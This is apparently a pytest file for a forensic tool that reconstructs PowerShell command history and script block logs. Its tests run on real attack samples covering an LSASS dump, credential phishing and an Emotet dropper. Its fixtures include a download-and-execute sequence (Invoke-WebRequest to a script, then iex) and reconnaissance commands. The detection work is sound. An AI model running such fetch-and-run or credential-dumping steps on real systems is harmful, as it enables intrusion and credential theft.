"""PowerShell in Activity (trace_app/core/activity/powershell.py): PSReadLine
history per user and host, and script blocks (event 4104) joined from
their parts, from real attack logs (EVTX-ATTACK-SAMPLES): an LSASS dump
through MiniDumpWriteDump, a credential phishing prompt, Emotet's
dropper -- the first two flagged by PowerShell itself, the third logged
plainly.
"""

import os
import shutil

import pytest

from tests.conftest import ROOT

SAMPLES = os.path.join(ROOT, 'test_images', 'artifact_samples')


def sample(name):
    path = os.path.join(SAMPLES, name)
    if not os.path.exists(path):
        if os.environ.get('TRACE_REQUIRE_IMAGES') == '1':
            pytest.fail(f"{name} missing")
        pytest.skip("run tools/fetch_artifact_samples.py")
    return path


def test_history_lines_and_continuations():
    from trace_app.core.activity.powershell import history_commands
    text = ("Get-Process\n"
            "Invoke-WebRequest -Uri http://x/a.ps1 `\n"
            "  -OutFile a.ps1\n"
            "\n"
            "iex (gc a.ps1)\n")
    assert history_commands(text) == [
        (1, 'Get-Process'),
        (2, 'Invoke-WebRequest -Uri http://x/a.ps1 \n  -OutFile a.ps1'),
        (5, 'iex (gc a.ps1)')]


def test_script_blocks_are_joined_in_order():
    from trace_app.core.activity.powershell import script_blocks
    import datetime
    stamp = datetime.datetime(2020, 1, 1, tzinfo=datetime.timezone.utc)

    def part(number, total, text, record):
        return {'event_id': 4104, 'record_id': record, 'time': stamp,
                'level': 5, 'user_sid': 'S-1-5-21-1',
                'data': {'ScriptBlockId': 'abc', 'MessageNumber': str(number),
                         'MessageTotal': str(total),
                         'ScriptBlockText': text}}
    (block,) = script_blocks([part(3, 4, 'c', 3), part(1, 4, 'a', 1),
                              part(2, 4, 'b', 2)])
    assert block['text'] == 'abc' and (block['parts'], block['total']) == \
        (3, 4) and not block['warning']


@pytest.mark.parametrize('name, blocks, flagged, contains', [
    ('attack-Powershell_4104_MiniDumpWriteDump_Lsass.evtx', 1, 1,
     'MiniDumpWriteDump'),
    ('attack-phish_windows_credentials_powershell_scriptblockLog_4104.evtx',
     2, 2, 'PromptForCredential'),
    ('attack-exec_emotet_ps_4104.evtx', 1, 0, 'ServicePointManager'),
])
def test_real_script_block_logs(name, blocks, flagged, contains):
    from trace_app.core.activity import evtx, powershell
    with open(sample(name), 'rb') as handle:
        events = list(evtx.records(handle.read()))
    records = powershell.script_block_records(events, '/log.evtx', 'r')
    assert len(records) == blocks
    assert sum('flagged' in r['what'] for r in records) == flagged
    assert any(contains in r['detail']['script'] for r in records)
    assert all(r['time'] and r['category'] == 'programs' for r in records)


def test_a_collection_s_powershell_reaches_activity(tmp_path):
    from trace_app.core.activity import collect
    from trace_app.core.image_handler import ImageHandler
    root = tmp_path / 'collection' / 'C'
    logs = root / 'Windows' / 'System32' / 'winevt' / 'Logs'
    logs.mkdir(parents=True)
    shutil.copyfile(
        sample('attack-Powershell_4104_MiniDumpWriteDump_Lsass.evtx'),
        logs / 'Microsoft-Windows-PowerShell%4Operational.evtx')
    readline = root / 'Users' / 'bob' / 'AppData' / 'Roaming' / \
        'Microsoft' / 'Windows' / 'PowerShell' / 'PSReadLine'
    readline.mkdir(parents=True)
    (readline / 'ConsoleHost_history.txt').write_bytes(
        b'whoami /all\r\nGet-Process lsass\r\n')
    handler = ImageHandler(str(tmp_path / 'collection'))
    try:
        records = collect(handler)
    finally:
        handler.close_resources()
    typed = [r for r in records if r['source'] == 'PowerShell history']
    assert [r['subject'] for r in typed] == ['whoami /all',
                                             'Get-Process lsass']
    assert {r['user'] for r in typed} == {'bob'}
    assert typed[0]['detail']['host'] == 'ConsoleHost'
    blocks = [r for r in records
              if r['source'] == 'PowerShell script block logging']
    assert len(blocks) == 1 and blocks[0]['what'].endswith('(flagged '
                                                          'suspicious)')
    assert blocks[0]['time'].startswith('2020-06-30 14:24:08')
